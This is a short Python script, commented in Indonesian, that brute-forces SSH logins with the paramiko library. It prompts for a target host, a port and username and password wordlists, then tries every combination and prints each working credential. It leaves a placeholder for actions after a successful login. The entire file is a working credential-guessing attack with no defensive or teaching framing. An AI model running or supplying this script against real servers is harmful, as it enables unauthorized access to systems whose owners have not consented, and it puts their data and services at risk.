import os
import paramiko

# Konfigurasi host SSH
alamat_host = input("Masukkan alamat host SSH: ")
port_ssh = int(input("Masukkan port SSH: "))

# Memeriksa keberadaan file wordlist username
file_username = input("Masukkan nama file wordlist username: ")
if not os.path.isfile(file_username):
    print(f"File {file_username} tidak ditemukan.")
    exit()

# Memeriksa keberadaan file wordlist password
file_password = input("Masukkan nama file wordlist password: ")
if not os.path.isfile(file_password):
    print(f"File {file_password} tidak ditemukan.")
    exit()

# Baca file wordlist username
with open(file_username, "r") as file:
    daftar_username = file.read().splitlines()

# Baca file wordlist password
with open(file_password, "r") as file:
    daftar_password = file.read().splitlines()

# Coba setiap kombinasi username dan password
for username in daftar_username:
    for password in daftar_password:
        try:
            # Buat koneksi SSH dengan timeout default 10 detik
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(alamat_host, port_ssh, username, password, timeout=10)

            # Jika berhasil login, tampilkan pesan sukses
            print(f"Login berhasil - Host: {alamat_host}, Username: {username}, Password: {password}")

            # Lakukan tindakan setelah login sukses
            # ...

            # Tutup koneksi SSH
            client.close()

        except paramiko.AuthenticationException:
            # Jika gagal login, tampilkan pesan gagal
            print(f"Gagal login - Host: {alamat_host}, Username: {username}, Password: {password}")

        except paramiko.SSHException as e:
            # Penanganan kesalahan koneksi SSH
            print(f"Kesalahan koneksi SSH - {str(e)}")

        except Exception as e:
            # Penanganan kesalahan umum
            print(f"Terjadi kesalahan - {str(e)}")
